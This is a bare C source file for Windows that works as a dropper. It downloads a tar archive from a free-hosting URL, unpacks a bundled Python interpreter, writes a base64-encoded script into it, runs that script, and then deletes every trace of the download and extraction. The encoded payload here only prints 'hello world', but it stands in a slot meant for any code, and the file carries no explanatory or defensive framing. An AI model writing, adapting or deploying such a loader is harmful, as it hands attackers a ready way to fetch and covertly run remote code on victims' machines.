#define IN "cHJpbnQoImhlbGxvIHdvcmxkIik="

#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <urlmon.h>
#include <dirent.h>
#include <stdio.h>

static int parseoct(const char *p, size_t n)
{
	int i = 0;
	while ((*p < '0' || *p > '7') && n > 0) {
		++p;
		--n;
	}
	while (*p >= '0' && *p <= '7' && n > 0) {
		i *= 8;
		i += *p - '0';
		++p;
		--n;
	}
	return (i);
}

static int is_end_of_archive(const char *p)
{
	int n;
	for (n = 511; n >= 0; --n)
		if (p[n] != '\0')
			return (0);
	return (1);
}

static void create_dir(char *pathname, int mode)
{
	char *p;
	int r;
	if (pathname[strlen(pathname) - 1] == '/')
		pathname[strlen(pathname) - 1] = '\0';
	r = _mkdir(pathname, mode);
	if (r != 0) {
		p = strrchr(pathname, '/');
		if (p != NULL) {
			*p = '\0';
			create_dir(pathname, 0700);
			*p = '/';
			r = _mkdir(pathname, mode);
		}
	}
}

static FILE * create_file(char *pathname, int mode)
{
	FILE *f;
	f = fopen(pathname, "wb+");
	if (f == NULL) {
		char *p = strrchr(pathname, '/');
		if (p != NULL) {
			*p = '\0';
			create_dir(pathname, 0700);
			*p = '/';
			f = fopen(pathname, "wb+");
		}
	}
	return (f);
}

static int verify_checksum(const char *p)
{
	int n, u = 0;
	for (n = 0; n < 512; ++n) {
		if (n < 148 || n > 155)
			u += ((unsigned char *)p)[n];
		else
			u += 0x20;
	}
	return (u == parseoct(p + 148, 8));
}

static void untar(FILE *a, const char *path)
{
	char buff[512];
	FILE *f = NULL;
	size_t bytes_read;
	int filesize;
	for (;;) {
		bytes_read = fread(buff, 1, 512, a);
		if (bytes_read < 512) {
			fprintf(stderr,
			    "Short read on %s: expected 512, got %d\n",
			    path, (int)bytes_read);
			return;
		}
		if (is_end_of_archive(buff)) {
			return;
		}
		if (!verify_checksum(buff)) {
			fprintf(stderr, "Checksum failure\n");
			return;
		}
		filesize = parseoct(buff + 124, 12);
		switch (buff[156]) {
		case '5':
			create_dir(buff, parseoct(buff + 100, 8));
			filesize = 0;
			break;
		case '6':
			break;
		default:
			f = create_file(buff, parseoct(buff + 100, 8));
			break;
		}
		while (filesize > 0) {
			bytes_read = fread(buff, 1, 512, a);
			if (bytes_read < 512) {
				fprintf(stderr,
				    "Short read on %s: Expected 512, got %d\n",
				    path, (int)bytes_read);
				return;
			}
			if (filesize < 512)
				bytes_read = filesize;
			if (f != NULL) {
				if (fwrite(buff, 1, bytes_read, f)
				    != bytes_read)
				{
					fprintf(stderr, "Failed write\n");
					fclose(f);
					f = NULL;
				}
			}
			filesize -= bytes_read;
		}
		if (f != NULL) {
			fclose(f);
			f = NULL;
		}
	}
}

int dld(const char *url, const char *outfile) 
{
	URLDownloadToFile(NULL, url, outfile, 0, NULL);
	return 0;
}

char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
                     
char* base64_decode(char* cipher) {
    char counts = 0;
    char buffer[4];
    char* plain = malloc(strlen(cipher) * 3 / 4);
    int i = 0, p = 0;
    for(i = 0; cipher[i] != '\0'; i++) {
        char k;
        for(k = 0 ; k < 64 && base46_map[k] != cipher[i]; k++);
        buffer[counts++] = k;
        if(counts == 4) {
            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
            if(buffer[2] != 64)
                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
            if(buffer[3] != 64)
                plain[p++] = (buffer[2] << 6) + buffer[3];
            counts = 0;
        }
    }
    plain[p] = '\0';
    return plain;
}

int remove_directory(const char *path) 
{
   DIR *d = opendir(path);
   size_t path_len = strlen(path);
   int r = -1;
   if (d) 
   {
      struct dirent *p;
      r = 0;
      while (!r && (p=readdir(d))) 
      {
          int r2 = -1;
          char *buf;
          size_t len;
          if (!strcmp(p->d_name, ".") || !strcmp(p->d_name, ".."))
             continue;
          len = path_len + strlen(p->d_name) + 2; 
          buf = malloc(len);

          if (buf) 
          {
             struct stat statbuf;

             snprintf(buf, len, "%s/%s", path, p->d_name);
             if (!stat(buf, &statbuf)) {
                if (S_ISDIR(statbuf.st_mode))
                   r2 = remove_directory(buf);
                else
                   r2 = unlink(buf);
             }
             free(buf);
          }
          r = r2;
      }
      closedir(d);
   }
   if (!r)
      r = rmdir(path);
   return r;
}


void wrt_data(const char *filepath, const char *data)
{
    FILE *fp = fopen(filepath, "ab");
    if (fp != NULL)
    {
        fputs(data, fp);
        fclose(fp);
    }
}

int extract()
{
	FILE *a;
	a = fopen("py.tar", "rb");
	untar(a, "py");
	fclose(a);
	return (0);
}

int prcs()
{
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo;
    char cmdArgs[] = " py\\main.py";
    ZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof StartupInfo ;

    if(CreateProcess("py\\python.exe", cmdArgs, 
        NULL,NULL,FALSE,0,NULL,
        NULL,&StartupInfo,&ProcessInfo))
    { 
        WaitForSingleObject(ProcessInfo.hProcess,INFINITE);
        CloseHandle(ProcessInfo.hThread);
		CloseHandle(ProcessInfo.hProcess);
    }  
    else
    {
        printf("The process could not be started...");
    }

    return 0;
}


int main()
{
	dld("https://limitles-rodents.000webhostapp.com/py.tar","py.tar");
	extract();
	wrt_data("py\\main.py",base64_decode(IN));
	int run = prcs();
	remove_directory("py");
	remove("py.tar");
}
